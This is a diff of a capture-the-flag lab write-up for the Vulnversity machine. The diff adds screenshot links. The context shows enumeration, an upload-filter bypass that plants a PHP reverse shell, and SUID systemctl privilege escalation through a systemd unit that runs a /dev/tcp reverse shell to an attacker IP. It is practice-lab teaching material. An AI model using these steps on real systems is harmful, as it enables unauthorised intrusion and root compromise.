@@ -23,6 +23,8 @@ Vulnversity is an easy Linux machine that walks through the full pentest methodo
 sudo nmap -sV 10.146.167.35
 ```
 
+![Recon nmap](imgs/01-recon-nmap.jpg)
+
 **Result:**
 
 | Port | Service | Version |
@@ -43,6 +45,8 @@ sudo nmap -sV 10.146.167.35
 gobuster dir -u http://10.146.167.35:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
 ```
 
+![Enum gobuster](imgs/02-enum-gobuster.jpg)
+
 **Result:**
 - `/images/` → 301
 - `/css/` → 301
@@ -51,13 +55,19 @@ gobuster dir -u http://10.146.167.35:3333 -w /usr/share/wordlists/dirbuster/dire
 
 **Finding:** `http://10.146.167.35:3333/internal/` hosts a file upload form.
 
+![Upload page /internal](imgs/03-upload-page.jpg)
+
 ### 3. Exploitation — Upload filter bypass + reverse shell
 
 The upload page filters extensions. Testing common ones revealed that PHP files are rejected **except** when the extension is `.phtml` (filter bypass).
 
 **Payload:** `php-reverse-shell.php` from pentestmonkey ([repo](https://github.com/pentestmonkey/php-reverse-shell)), renamed to `php-reverse-shell.phtml`, with attacker IP/port set.
 
+![Payload pentestmonkey](imgs/04-payload-pentestmonkey.jpg)
+
 **Upload:** `http://10.146.167.35:3333/internal/index.php` → `Success ✅`
+
+![Upload success](imgs/05-upload-success.jpg)
 
 **Trigger + listener (attacker Kali):**
 ```bash
@@ -74,6 +84,8 @@ www-data
 ```
 Low-privilege shell obtained. Upgrade on the box: `python3 -c 'import pty;pty.spawn("/bin/bash")'` (or `script`).
 
+![Shell www-data](imgs/06-shell-wwwdata.jpg)
+
 ### 4. Privilege Escalation — SUID `systemctl`
 
 **Enumeration:**
@@ -81,6 +93,8 @@ Low-privilege shell obtained. Upgrade on the box: `python3 -c 'import pty;pty.sp
 find / -perm -4000 2>/dev/null
 ```
 `/bin/systemctl` appears with the SUID bit and root ownership → GTFOBins technique: create a malicious systemd unit and run it as root via `systemctl`.
+
+![find SUID](imgs/07-suid-find.jpg)
 
 **Unit (`/tmp/rvsh.service`):**
 ```ini
@@ -91,12 +105,16 @@ ExecStart=/bin/bash -c "bash -i >& /dev/tcp/192.168.129.155/4444 0>&1"
 WantedBy=multi-user.target
 ```
 
+![Unit creation /tmp](imgs/08-systemctl-unit.jpg)
+
 **Fire it:**
 ```bash
 systemctl link /tmp/rvsh.service      # register the unit
 systemctl enable --now rvsh           # enable + start
 ```
 > ⚠️ First attempt `systemctl enable --now /tmp/rvsh` failed with *"Failed to enable unit: Invalid argument"* — systemd expects the unit name, not the full path. Using `rvsh` worked.
+
+![link + enable](imgs/09-link-enable.jpg)
 
 **Listener (attacker Kali):**
 ```bash
@@ -111,6 +129,8 @@ bash: cannot set terminal process group: Inappropriate ioctl for device
 root
 ```
 **ROOT ✅** — full system compromise.
+
+![Shell root](imgs/10-root.jpg)
 
 ---
 
